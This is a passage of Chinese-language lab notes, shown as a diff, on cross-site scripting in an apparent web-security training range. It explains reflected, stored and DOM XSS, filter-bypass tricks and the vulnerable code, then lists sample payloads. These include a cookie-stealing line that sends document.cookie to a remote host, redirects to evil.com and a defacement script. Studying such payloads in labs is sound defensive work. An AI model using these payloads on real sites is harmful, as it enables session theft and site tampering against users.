@@ -108,3 +108,61 @@ payload2为token,b把之前复制的token填入initial payload里面
 d、开始爆破，爆破成功
 
 ![1568625717579](/图片/1568625717579.png)
+
+# 二、Cross-Site Scripting
+
+​		Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
+​         1.反射性XSS;
+​          2.存储型XSS;
+​          3.DOM型XSS;
+​          XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
+​            因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
+​            输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
+​            输出转义：根据输出点的位置对输出到前端的内容进行适当转义。
+​          对于过滤，我们会通过各种方法去绕过:
+
+​           前端过滤绕过：抓包拦截改包
+
+​           大小写绕过：<ScipT>alert(/xss/)</SCipt>
+
+​            双写绕过：<scr<script>ipt>alert(/xss/)</s</script>cript>
+
+​            注释干扰：<sc<!--content-->ript>alert(/xss/)</scr<!--content-->ipt>
+
+​            编码绕过：依据前端编码解码机制
+
+## 1、反射型xss(get)
+
+### 1）漏洞验证：
+
+页面只有一个输入框并设置了长度限制，随便输入一个字符，并在页面上返回字符，在message参数直接提交payload:<script>alert(1)</script>。
+
+![1568704670690](/图片/1568704670690.png)
+
+其他一些有趣的payload:
+
+<a href=""  onclick=alert("xss")>type<a>
+<img src='' onerror=alert("xss")>
+
+<script>window.location='http://1.1.1.1'</script＞
+<script>document.location.href="http://www.evil.com"</script>
+<iframe src="http://1.1.1.1/victim" height = "0" width = "0"></iframe>
+<srcipt>new.Image.src="192.168.1.104/c.php?output="+document.cookie</script>
+<script>document.body.innerHTML="<div stytle=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1>"</script>
+
+### 2)代码分析
+
+服务器获取用户通过get提交过来的message,没有过滤就通过字符串拼接赋值给html，并且没有做任何编码处理就打印出来。
+
+![1568717795251](/图片/1568717795251.png)
+
+![1568717963826](/图片/1568717963826.png)
+
+### 3）漏洞利用
+
+#### a、窃取cookie
+
+
+
+## 2、反射性xss(post)
+
